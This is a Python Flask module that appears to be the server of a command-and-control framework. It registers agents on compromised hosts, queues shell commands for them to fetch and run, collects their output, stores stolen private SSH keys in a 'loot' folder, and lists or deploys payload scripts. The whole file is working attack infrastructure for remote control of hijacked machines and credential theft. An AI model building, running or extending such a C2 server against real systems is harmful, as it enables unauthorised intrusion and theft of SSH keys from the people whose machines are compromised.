"""
Blueprint that contains all of the API endpoints used internally
by users and externally by agents.
"""

import os
import yaml
import glob

from datetime import datetime

from flask import Blueprint, request

from src.c2.models import Agent, Command, db

api = Blueprint("api", __name__)


@api.route("/api/1.1/register_agent", methods=["POST"])
def register_agent():
    """API endpoint that allows an agent to register
    itself to the server

    :returns: the new agent ID
    :rtype: str
    """
    if request.method == "POST":
        agent_info = request.json
        if agent_info:
            args = []
            args += [str(agent_info["Stats"]["hostname"])]
            args += [str(agent_info["Stats"]["os"])]
            args += [agent_info["USERNAME"]]
            args += [agent_info["IP"]]
            args += [agent_info["SleepTime"]]
            if agent_exists(agent_info["IP"]) == False:
                new_agent = Agent(*args)
                db.session.add(new_agent)
                db.session.flush()
                agent_id = new_agent.id
                db.session.commit()
                return str(agent_id)
            else:
                return str(Agent.query.filter(Agent.ip == agent_info["IP"]).first().id)
    return "Bad Request"


def agent_exists(ip):
    agent = Agent.query.filter(Agent.ip == ip).first()
    if agent is not None:
        return True
    return False


@api.route("/api/1.1/add_command", methods=["POST"])
def add_command():
    """API endpoint that allows the agent terminal to add
    commands to the Command table in the database

    :returns: a json RPC object containing any finished jobs and the new job ID
    :rtype: dict
    """
    if request.method == "POST":
        json = request.json
        if json is None:
            return {}
        command = json["params"]
        agent_id = json["method"].split("agent")[1]
        new_comm = Command(agent_id=agent_id, command=command)
        db.session.add(new_comm)
        db.session.flush()
        db.session.commit()
        db.session.refresh(new_comm)
        res = Command.query.filter(
            Command.agent_id == agent_id,
            Command.retrieved == True,
            Command.displayed == False,
        ).first()
        output = f"[+] new job started with id {new_comm.command_id}"
        if res is not None and res.output is not None:
            res.displayed = True
            output += f"\n[*] job with id {res.command_id} finished with output: \n{res.output}"
            db.session.flush()
            db.session.commit()
        rpc = {}
        rpc["result"] = output
        rpc["jsonrpc"] = json["jsonrpc"]
        rpc["id"] = json["id"]
        return rpc
    return "Bad request"


@api.route("/api/1.1/get_command", methods=["POST"])
def get_command():
    """API endpoint that allows an agent to fetch
    commands from the server

    :returns: none if there are no commands to retrieve, else the command and it's ID
    :rtype: str
    """
    if request.method == "POST":
        command_data = request.json
        if command_data:
            agent_id = int(command_data["id"])
            agent = Agent.query.filter(Agent.id == agent_id).first()
            curr_time = datetime.now()
            agent.last_seen = curr_time.strftime("%d %B, %Y %H:%M:%S")
            db.session.commit()
            db.session.flush()
            res = Command.query.filter(
                Command.agent_id == agent_id, Command.retrieved == False
            ).first()
            print(res)
            if res is None:
                db.session.commit()
                db.session.flush()
                return "None"
            res.retrieved = True
            db.session.flush()
            db.session.commit()
            return res.command + "," + str(res.command_id)
    return "Bad Request"


@api.route("/api/1.1/command_out", methods=["POST"])
def command_out():
    """API endpoint that allows an agent to send
    output of commands back to the server

    :returns: status to the agent of whether it received the output
    :rtype: str
    """
    print(request.method)
    if request.method == "POST":
        json = request.json
        if json:
            output = json["output"]
            agent_id = json["agent_id"]
            command_id = json["command_id"]
            command = Command.query.filter(
                Command.agent_id == agent_id, Command.command_id == command_id
            ).first()
            command.output = output
            db.session.flush()
            db.session.commit()
            return "Received"
    return "Bad Request"


@api.route("/api/1.1/ssh_keys", methods=["POST"])
def ssh_keys():
    """API endpoint that allows an agent to send back exfiltrated
    private ssh keys

    :returns: status to the agent of whether it received the keys
    :rtype: str
    """
    if request.method == "POST":
        json = request.json
        if json:
            key_dict = json["keys"]
            agent_id = json["id"]
            with open(f"loot/agent_{agent_id}/ssh_keys.txt", "a+") as file:
                for key in key_dict:
                    file.write(f"{key}: {key_dict[key]}\n")
            return "[*] Received SSH keys"
    return "Bad Request"


@api.route("/api/1.1/fetch_payloads", methods=["POST", "GET"])
def payloads():
    """API endpoint that allows an agent to retrieve scripts
    from the server

    """
    if request.method == "POST":
        json = request.json
        if json is None:
            return {}

        command = json["params"]
        rpc = {}
        rpc["jsonrpc"] = json["jsonrpc"]
        rpc["id"] = json["id"]

        if "deploy" in command:
            payload = command[7:]
            rpc["result"] = f"[*] Deploying {payload}"
        elif command == "list":
            rpc["result"] = get_yaml()
        return rpc
    return "Bad request"


def get_yaml():
    output = ""
    os.chdir("../breaks")
    count = 1
    for file in glob.glob("**/*.yml", recursive=True):
        parsed = read_yaml_file(file)
        output += f"{count})\n{parsed}"
        count += 1
    return output


def read_yaml_file(filename):
    with open(filename, "r") as file:
        try:
            return yaml.dump(yaml.safe_load(file))
        except yaml.YAMLError as exc:
            print(exc)
